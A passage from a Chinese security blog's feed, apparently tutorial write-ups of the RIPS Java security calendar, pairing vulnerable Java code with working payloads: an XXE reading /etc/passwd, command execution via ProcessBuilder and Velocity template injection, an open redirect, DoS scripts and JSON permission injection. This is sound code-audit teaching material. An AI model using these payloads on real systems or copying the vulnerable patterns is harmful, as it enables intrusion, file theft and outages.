class="string">"blue"</span></span><br></pre></td></tr></table></figure><p>代码对<code>$pi</code>进行了过滤，通过<code>is_numeric</code>规定必须为数字类型的变量，需要注意的点如下：</p><ul><li>判读是否为数字，如果提交的参数是数字或者数字字符串就正常，也就是TRUE，否则返回FALSE。仅用is_numeric判断而不用intval函数转换，就有可能插入16进制的字符串到数据库，进而可能导致sql二次注入。</li><li>php7以后十六进制字符串不再被认为是数字。</li></ul><p>在输入为字符串的情况下，执行了<code>goAway()</code>函数，但没有进行<code>die()</code>或者<code>exit()</code>，操作，这导致后面的代码依然可以执行。<code>assert()</code>为断言函数，这是一个调试函数，它会检测一个断言是否为False。它与eval的用法类似，可以将字符串当成PHP代码来执行，但是断言这个功能应该只被用来调试。</p><ul><li>php7以后<code>assert</code>默认不再可以执行代码，菜刀在实现文件管理器的时候用的恰好也是assert函数，这也导致菜刀没办法在PHP7上正常运行。 </li></ul><h3 id="漏洞验证-8"><a href="#漏洞验证-8" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pi=phpinfo()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学校延期开学，在家闲着没事，打算重新复习下php代码审计方面的知识，找到了RIPS Technologies2017年的一个代码审计项目，之前只是大致读过没有仔细分析，这次记录一下分析过程，第一篇。&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="https://www.sys71m.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="https://www.sys71m.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Java代码审计(一)</title>
    <link href="https://www.sys71m.top/2020/02/08/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%80)/"/>
    <id>https://www.sys71m.top/2020/02/08/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%80)/</id>
    <published>2020-02-08T07:10:12.000Z</published>
    <updated>2020-11-04T23:46:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>通过一些典型的Java代码来分析易产生漏洞的点，入门篇。。。</p><a id="more"></a>  <h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://www.ripstech.com/java-security-calendar-2019/</span></span><br></pre></td></tr></table></figure><h2 id="Day-1-Candy-Cane之XXE攻击"><a href="#Day-1-Candy-Cane之XXE攻击" class="headerlink" title="Day 1 - Candy Cane之XXE攻击"></a>Day 1 - Candy Cane之XXE攻击</h2><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.jdom2.Content;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.Document;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.JDOMException;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.input.SAXBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ImportDocument</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">extractString</span><span class="params">()</span> <span class="keyword">throws</span> IOException, JDOMException </span>&#123;</span><br><span class="line">    File initialFile = <span class="keyword">new</span> File(<span class="string">"uploaded_office_doc.odt"</span>);</span><br><span class="line">    InputStream in = <span class="keyword">new</span> FileInputStream(initialFile);</span><br><span class="line">    <span class="keyword">final</span> ZipInputStream zis = <span class="keyword">new</span> ZipInputStream(in);</span><br><span class="line">    ZipEntry entry;</span><br><span class="line">    List&lt;Content&gt; content = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((entry = zis.getNextEntry()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (entry.getName().equals(<span class="string">"content.xml"</span>)) &#123;</span><br><span class="line">        <span class="keyword">final</span> SAXBuilder sax = <span class="keyword">new</span> org.jdom2.input.SAXBuilder();</span><br><span class="line">        sax.setFeature(<span class="string">"http://javax.xml.XMLConstants/feature/secure-processing"</span>,<span class="keyword">true</span>);</span><br><span class="line">        Document doc = sax.build(zis);</span><br><span class="line">        content = doc.getContent();</span><br><span class="line">        zis.close();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">if</span> (content != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span>(Content item : content)&#123;</span><br><span class="line">        sb.append(item.getValue());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>手册：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.jdom.org/docs/apidocs/</span><br></pre></td></tr></table></figure><p>查看手册可知，<code>SAXBuilder</code>类主要对xml文件进行解析，当解析的内容可控时可构造恶意的xml文件进行xxe攻击。代码中通过读取<code>uploaded_office_doc.odt</code>文件（实际上也是一个ZIP文件），进行遍历判断是否存在<code>content.xml</code>文件，存在的话则对xml文件进行解析。</p><p>构造如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">text</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span> &gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Day-2-Eggnog-Madness之任意对象实例化"><a href="#Day-2-Eggnog-Madness之任意对象实例化" class="headerlink" title="Day 2 - Eggnog Madness之任意对象实例化"></a>Day 2 - Eggnog Madness之任意对象实例化</h2><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.json.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainController</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> String[] parseJsonAsArray(String rawJson, String field) &#123;</span><br><span class="line">    JSONObject obj = <span class="keyword">new</span> JSONObject(rawJson);</span><br><span class="line">    JSONArray arrJson = obj.getJSONArray(field);</span><br><span class="line">    String[] arr = <span class="keyword">new</span> String[arrJson.length()];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arrJson.length(); i++) &#123;</span><br><span class="line">      arr[i] = arrJson.getString(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">parseJsonAsString</span><span class="params">(String rawJson, String field)</span> </span>&#123;</span><br><span class="line">    JSONObject obj = <span class="keyword">new</span> JSONObject(rawJson);</span><br><span class="line">    <span class="keyword">return</span> obj.getString(field);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">MainController</span><span class="params">(String rawJson)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(parseJsonAsString(rawJson, <span class="string">"controller"</span>), parseJsonAsString(rawJson, <span class="string">"task"</span>), parseJsonAsArray(rawJson, <span class="string">"data"</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">MainController</span><span class="params">(String controllerName, String task, String... data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Object controller = !controllerName.equals("MainController") ? Class.forName(controllerName).getConstructor(String[].class).newInstance((Object) data) : this;</span><br><span class="line">      System.out.println(controller.getClass().getMethod(task));</span><br><span class="line">      controller.getClass().getMethod(task).invoke(controller);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        String log = <span class="string">"# [ERROR] Exception with data: "</span> + data + <span class="string">" with exception "</span> + e1;</span><br><span class="line">        System.err.println(log);</span><br><span class="line">       </span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"java"</span>, <span class="string">"-jar"</span>, <span class="string">"log4j_custom_dlogger.jar"</span>, log.replaceAll(<span class="string">"."</span>, <span class="string">""</span>)&#125;);</span><br><span class="line">        </span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">        System.err.println(<span class="string">"FATAL ERROR: "</span> + e2);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码不是很长，大致逻辑为判断传入参数是否为<code>MainController</code>，是的话则直接对<code>Object</code>赋值，不再进行实例化，不是的话根据传入的控制器名进行实例化并调用任意方法。由于参数可控，则可对任意对象进行实例化并调用其函数。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rawJson=&#123;&quot;controller&quot;:&quot;java.lang.ProcessBuilder&quot;,&quot;task&quot;:&quot;start&quot;,&quot;data&quot;:[&quot;touch&quot;,&quot;hacked.jsp&quot;]&#125;</span><br></pre></td></tr></table></figure><p>此类用于创建操作系统进程。每个<code>ProcessBuilder</code>实例管理一个进程属性集。<code>start()</code>方法利用这些属性创建一个新的 <code>Process</code>实例。</p><h2 id="Day-3-Christmas-Carols之Velocity模版注入"><a href="#Day-3-Christmas-Carols之Velocity模版注入" class="headerlink" title="Day 3 - Christmas Carols之Velocity模版注入"></a>Day 3 - Christmas Carols之Velocity模版注入</h2><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.app.VelocityEngine;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplateRenderer</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> VelocityEngine velocity;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">renderFragment</span><span class="params">(String fragment, Map&lt;String,Object&gt; contextParameters)</span> </span>&#123;</span><br><span class="line">    velocity = <span class="keyword">new</span> VelocityEngine();</span><br><span class="line">    velocity.init();</span><br><span class="line">    VelocityContext context =  <span class="keyword">new</span> VelocityContext(contextParameters);</span><br><span class="line">    StringWriter tempWriter = <span class="keyword">new</span> StringWriter(fragment.length());</span><br><span class="line">    velocity.evaluate(context, tempWriter, <span class="string">"renderFragment"</span>, fragment);</span><br><span class="line">    <span class="keyword">return</span> tempWriter.toString();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">render</span><span class="params">(HttpServletRequest req, HttpServletResponse res)</span> </span>&#123;</span><br><span class="line">    Map&lt;String, Object&gt; hm = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">    hm.put(<span class="string">"user"</span>, req.getParameter(<span class="string">"user"</span>));</span><br><span class="line">    String template = req.getParameter(<span class="string">"temp"</span>);</span><br><span class="line">    String rendered = renderFragment(template,hm);</span><br><span class="line">    res.getWriter().println(rendered);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Velocity模板引擎非常强大。你可以在模板中使用条件判断，循环，外部函数调用等逻辑代码。它里面也没有一个沙箱去限制操作。一个恶意的用户如果可以控制模板，那么他就可以在服务器端运行恶意代码。</p><p>代码中的velocity.evaluate()函数，用来在运行时动态解析模版语言，因此，若传入的是Java代码，即可执行Java代码。而fragment参数是可由攻击者控制的，fragment参数值会被Velocity当作Java代码执行，因此可导致代码注入漏洞。</p><p>这种模版注入的限制是攻击者不能执行Java代码。因此，需要使用Java反射机制来访问Java类最终达到执行任意命令。</p><p><strong>Java反射</strong>机制是指在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性。这种动态获取信息以及动态调用对象的方法的功能称为java语言的反射机制。</p><p>Velocity指令以#开头，后面跟一个关键字，例如<code>#set</code>指令，其功能是向一个变量或属性赋值。首先将一个变量<code>$s</code>赋值为空，即<code>#set($s=&quot;&quot;)</code>，然后再向一个变量<code>$stringClass</code>赋值为前一个变量的对象调用,获取基类，这个基类有<code>Java.lang.Runtime</code>的类对象。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&amp;temp=#set($s=&quot;&quot;)#set($stringClass=$s.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch hacked.jsp&quot;))$stringClass</span><br></pre></td></tr></table></figure><h2 id="Day-4-Father-Christmas之任意重定向"><a href="#Day-4-Father-Christmas之任意重定向" class="headerlink" title="Day 4 - Father Christmas之任意重定向"></a>Day 4 - Father Christmas之任意重定向</h2><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Login</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">    String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">    <span class="keyword">if</span> (url.startsWith(<span class="string">"/"</span>)) &#123;</span><br><span class="line">      response.sendRedirect(url);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中url参数是由攻击者可控的，然后在经过<code>startsWith(&quot;/&quot;)</code>的判断后，进行<code>endRedirect()</code>函数进行跳转。本来<code>startsWith(&quot;/&quot;)</code>的判断是为了保证跳转的url是一个相对路径在本域下，然而以/开头的url并非只有相对路径才可以，例如<code>//attacker.org</code>是一个不带scheme的绝对路径URI，在进行跳转时，会直接跳转到<code>http://attacker.org</code></p><p>payload：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=//attacker.org</span><br></pre></td></tr></table></figure><h2 id="Day-5-Wintertime之拒绝服务攻击"><a href="#Day-5-Wintertime之拒绝服务攻击" class="headerlink" title="Day 5 - Wintertime之拒绝服务攻击"></a>Day 5 - Wintertime之拒绝服务攻击</h2><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.util.Enumeration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Request</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">toString</span><span class="params">(HttpServletRequest req)</span> </span>&#123;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    String delimiter = req.getParameter(<span class="string">"delim"</span>);</span><br><span class="line">    Enumeration&lt;String&gt; names = req.getParameterNames();</span><br><span class="line">    <span class="keyword">while</span> (names.hasMoreElements()) &#123;</span><br><span class="line">      String name = names.nextElement();</span><br><span class="line">      <span class="keyword">if</span> (!name.equals(<span class="string">"delim"</span>)) &#123;</span><br><span class="line">        sb.append(<span class="string">"&lt;b&gt;"</span> + name + <span class="string">"&lt;/b&gt;:&lt;br&gt;"</span>);</span><br><span class="line">        String[] values = req.getParameterValues(name);</span><br><span class="line">        <span class="keyword">for</span> (String val : values) &#123;</span><br><span class="line">          sb.append(val);</span><br><span class="line">          sb.append(delimiter);</span><br><span class="line">          sb.append(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码的第6行实例化了<code>StringBuilder</code>对象，<code>StringBuilder</code>是可变对象，用来高效拼接字符串；默认情况下，<code>StringBuilder</code>对象初始化为大小为16的数组。每次追加新值时，<code>StringBuilder</code>实例都会检查数据是否适合数组。否则，数组的大小将加倍。在这种情况下，会有一个大的放大，这会导致Java堆耗尽内存。默认情况下，<code>Apache Tomcat</code>对POST请求具有2MB限制，最大参数为10000个参数。如果我们将参数Delm（例如，1.8 MB）与一个具有多个（例如10000个）HTTP参数的数组结合起来的值非常大，则考虑到StrugBuuDER内部结构，我们可以最大限度地扩大因子~（20000）。</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost:8080/day5"</span></span><br><span class="line">delim = <span class="string">""</span></span><br><span class="line">A=[]</span><br><span class="line">data=<span class="string">"delim="</span>+delim</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30000</span>):</span><br><span class="line">    delim = delim+<span class="string">'------------------------------------------------'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">300</span>):</span><br><span class="line">    A.append(<span class="string">"test_the_DoS"</span>)</span><br><span class="line">    data=data+<span class="string">"&amp;A&#123;index&#125;="</span>.format(index=i)+A[i<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">header=&#123;<span class="string">'content-type'</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;</span><br><span class="line">res=requests.post(url=url,data=data,headers=header)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><h2 id="Day-6-Yule之拒绝服务攻击"><a href="#Day-6-Yule之拒绝服务攻击" class="headerlink" title="Day 6 - Yule之拒绝服务攻击"></a>Day 6 - Yule之拒绝服务攻击</h2><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReadFile</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">      String data = <span class="keyword">new</span> String(Files.readAllBytes(Paths.get(url)));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">      PrintWriter out = response.getWriter();</span><br><span class="line">      out.print(<span class="string">"File not found"</span>);</span><br><span class="line">      out.flush();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读代码可以看出，通过<code>url</code>参数来获取文件路径，并读取文件的内容，但内容无法返回客户端，无法造成任意文件读取，但路径可控，可以读取<code>/dev/random</code>来造成拒绝服务攻击。</p><p><code>/dev/random</code>在<a href="https://zh.wikipedia.org/wiki/类UNIX系统" target="_blank" rel="noopener">类UNIX系统</a>中是一个特殊的<a href="https://zh.wikipedia.org/wiki/设备文件" target="_blank" rel="noopener">设备文件</a>，可以用作<a href="https://zh.wikipedia.org/wiki/随机数发生器" target="_blank" rel="noopener">随机数发生器</a>或<a href="https://zh.wikipedia.org/w/index.php?title=伪随机数发生器&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">伪随机数发生器</a>。在访问这个文件是可一直读取，并最终导致IOException处理程序无法捕获的内存耗尽。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=/dev/random</span><br></pre></td></tr></table></figure><h2 id="Day-7-Jingle-Bells之伪造提权"><a href="#Day-7-Jingle-Bells之伪造提权" class="headerlink" title="Day 7 - Jingle Bells之伪造提权"></a>Day 7 - Jingle Bells之伪造提权</h2><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApiCache</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                        HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    storeJson(request, <span class="string">"/tmp/getUserInformation.json"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                       HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">    loadJson();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loadJson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">storeJson</span><span class="params">(HttpServletRequest request, String filename)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    JsonFactory jsonobject = <span class="keyword">new</span> JsonFactory();</span><br><span class="line">    JsonGenerator jGenerator = jfactory.createGenerator(<span class="keyword">new</span> File(filename), JsonEncoding.UTF8);</span><br><span class="line">    jGenerator.writeStartObject();</span><br><span class="line">    jGenerator.writeFieldName(<span class="string">"username"</span>);</span><br><span class="line">    jGenerator.writeRawValue(<span class="string">"\""</span> + request.getParameter(<span class="string">"username"</span>) + <span class="string">"\""</span>);</span><br><span class="line">    jGenerator.writeFieldName(<span class="string">"permission"</span>);</span><br><span class="line">    jGenerator.writeRawValue(<span class="string">"\"none\""</span>);</span><br><span class="line">    jGenerator.writeEndObject();</span><br><span class="line">    jGenerator.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由代码可知，存在一个记录用户信息的<code>json</code>文件，在写入过程中，参数<code>username</code>完全可控，通过特意构造的用户名可以使<code>none</code>权限改为任意权限，成功利用此漏洞还取决于<code>loadJson()</code>的实现。要成功利用此问题，<code>loadJson()</code>方法必须仅反序列化每个键的第一个匹配项，以便忽略重复键。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=foo&quot;,&quot;permission&quot;:&quot;all</span><br></pre></td></tr></table></figure><p>result：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  